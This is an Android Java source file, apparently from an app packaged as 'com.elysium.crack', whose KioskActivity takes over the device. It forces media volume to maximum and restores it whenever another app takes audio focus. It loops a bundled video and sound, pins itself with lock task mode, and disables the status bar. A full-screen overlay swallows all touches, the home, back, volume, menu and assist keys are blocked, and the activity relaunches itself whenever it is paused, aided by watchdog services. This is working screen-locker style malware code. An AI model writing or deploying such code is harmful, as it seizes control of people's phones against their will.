package com.elysium.crack;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.VideoView;

public class KioskActivity extends Activity {

    private VideoView videoView;
    private MediaPlayer videoMp;
    private MediaPlayer audioMp;
    private AudioManager audioManager;
    private AudioManager.OnAudioFocusChangeListener focusListener;
    private int originalVolume = -1;
    private int originalMode = -1;
    private View touchBlocker;
    private boolean videoReady = false;
    private boolean audioReady = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);

        FrameLayout root = new FrameLayout(this);
        videoView = new VideoView(this);
        root.addView(videoView, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));
        setContentView(root);

        forceAudioOn();
        setupVideo();
        setupAudio();

        startLockTaskOrPin();
        installTouchBlocker();

        startService(new Intent(this, KioskService.class));
        startService(new Intent(this, WatchdogService.class));
    }

    private void setupVideo() {
        Uri uri = Uri.parse("android.resource://" + getPackageName() + "/" + R.raw.video1);
        videoView.setVideoURI(uri);
        videoView.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {
            public void onPrepared(MediaPlayer mp) {
                videoMp = mp;
                mp.setLooping(false);
                mp.setVolume(0f, 0f);
                mp.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
                    public void onCompletion(MediaPlayer m) {
                        restartBoth();
                    }
                });
                videoReady = true;
                tryStartBoth();
            }
        });
    }

    private void setupAudio() {
        audioMp = MediaPlayer.create(this, R.raw.zvyk1);
        if (audioMp != null) {
            audioMp.setLooping(true);
            audioMp.setVolume(1f, 1f);
            audioReady = true;
            tryStartBoth();
        }
    }

    private void tryStartBoth() {
        if (videoReady && audioReady) {
            restartBoth();
        }
    }

    private void restartBoth() {
        if (videoMp != null) {
            videoMp.seekTo(0);
            videoMp.start();
        }
        if (audioMp != null) {
            audioMp.seekTo(0);
            audioMp.start();
        }
    }

    private void forceAudioOn() {
        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        if (audioManager == null) return;

        originalVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC);
        originalMode = audioManager.getRingerMode();

        try {
            audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
        } catch (Throwable ignored) {}

        int max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0);

        focusListener = new AudioManager.OnAudioFocusChangeListener() {
            public void onAudioFocusChange(int change) {
                if (change == AudioManager.AUDIOFOCUS_LOSS
                        || change == AudioManager.AUDIOFOCUS_LOSS_TRANSIENT) {
                    int mx = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                    audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, mx, 0);
                }
            }
        };
        audioManager.requestAudioFocus(focusListener,
                AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN);
    }

    private void startLockTaskOrPin() {
        DevicePolicyManager dpm =
                (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm.isDeviceOwnerApp(getPackageName())) {
            dpm.setLockTaskPackages(new ComponentName(this, AdminReceiver.class),
                    new String[]{getPackageName()});
            dpm.setStatusBarDisabled(new ComponentName(this, AdminReceiver.class), true);
        }
        try {
            startLockTask();
        } catch (Throwable ignored) {}
    }

    private void installTouchBlocker() {
        if (!Settings.canDrawOverlays(this)) return;

        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        int type = Build.VERSION.SDK_INT >= 26
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_PHONE;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.TOP | Gravity.START;
        params.x = 0;
        params.y = 0;

        touchBlocker = new View(this) {
            @Override
            public boolean onTouchEvent(MotionEvent event) {
                return true;
            }
        };

        wm.addView(touchBlocker, params);
    }

    @Override
    public void onBackPressed() {
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_HOME
                || keyCode == KeyEvent.KEYCODE_APP_SWITCH
                || keyCode == KeyEvent.KEYCODE_BACK
                || keyCode == KeyEvent.KEYCODE_VOLUME_UP
                || keyCode == KeyEvent.KEYCODE_VOLUME_DOWN
                || keyCode == KeyEvent.KEYCODE_VOLUME_MUTE
                || keyCode == KeyEvent.KEYCODE_MENU
                || keyCode == KeyEvent.KEYCODE_ASSIST) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    protected void onPause() {
        super.onPause();
        Intent i = new Intent(this, KioskActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
        startActivity(i);
    }

    @Override
    protected void onDestroy() {
        if (touchBlocker != null) {
            try {
                WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                wm.removeView(touchBlocker);
            } catch (Throwable ignored) {}
            touchBlocker = null;
        }

        if (videoMp != null) {
            videoMp.release();
            videoMp = null;
        }
        if (audioMp != null) {
            audioMp.release();
            audioMp = null;
        }

        if (audioManager != null) {
            if (focusListener != null) {
                audioManager.abandonAudioFocus(focusListener);
            }
            if (originalVolume >= 0) {
                try {
                    audioManager.setStreamVolume(
                            AudioManager.STREAM_MUSIC, originalVolume, 0);
                } catch (Throwable ignored) {}
            }
            if (originalMode >= 0) {
                try {
                    audioManager.setRingerMode(originalMode);
                } catch (Throwable ignored) {}
            }
        }
        super.onDestroy();
    }
}